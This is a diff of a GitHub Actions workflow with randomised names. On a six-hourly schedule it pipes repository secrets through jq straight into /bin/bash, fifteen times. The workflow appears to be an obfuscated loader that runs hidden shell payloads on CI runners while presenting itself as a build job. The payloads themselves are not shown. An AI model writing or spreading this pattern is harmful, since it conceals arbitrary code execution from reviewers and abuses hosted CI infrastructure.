@@ -3,27 +3,30 @@ name: leidate7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
+    - cron: '33 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          nq2: ${{ secrets.nq2 }}
+          cyt2709: ${{ secrets.cyt2709 }}
         run: |
-          echo $nq2 | jq -r .aurw0 | /bin/bash
-          echo $qbw60220 | jq -r .akbc07 | /bin/bash
-          echo $qmrr12 | jq -r .eyyj9 | /bin/bash
-          echo $cqtjw76 | jq -r .pnt8 | /bin/bash
-          echo $pdxcb942 | jq -r .zei49 | /bin/bash
-          echo $jd9669 | jq -r .zpa3 | /bin/bash
-          echo $jf2 | jq -r .a173 | /bin/bash
-          echo $wrm292 | jq -r .igyv4 | /bin/bash
-          echo $z44973 | jq -r .wgy0 | /bin/bash
-          echo $s7 | jq -r .koh59 | /bin/bash
-          echo $m548 | jq -r .pud5366 | /bin/bash
-          echo $toptm671 | jq -r .ch65402 | /bin/bash
+          echo $cyt2709 | jq -r .ub5 | /bin/bash
+          echo $qvth6 | jq -r .tqcd813 | /bin/bash
+          echo $dmy85435 | jq -r .k0044 | /bin/bash
+          echo $o1813 | jq -r .alzm6270 | /bin/bash
+          echo $ado1 | jq -r .vi7652 | /bin/bash
+          echo $qi1 | jq -r .qv01 | /bin/bash
+          echo $taar1 | jq -r .vpcej334 | /bin/bash
+          echo $e021 | jq -r .qqk0 | /bin/bash
+          echo $wj02 | jq -r .ftm967 | /bin/bash
+          echo $i3 | jq -r .rave285 | /bin/bash
+          echo $e31730 | jq -r .try5218 | /bin/bash
+          echo $kbvk3 | jq -r .dgfc684 | /bin/bash
+          echo $hhzad10 | jq -r .ndg932 | /bin/bash
+          echo $lzfsg46 | jq -r .cyzbv125 | /bin/bash
+          echo $win177 | jq -r .q2 | /bin/bash
 
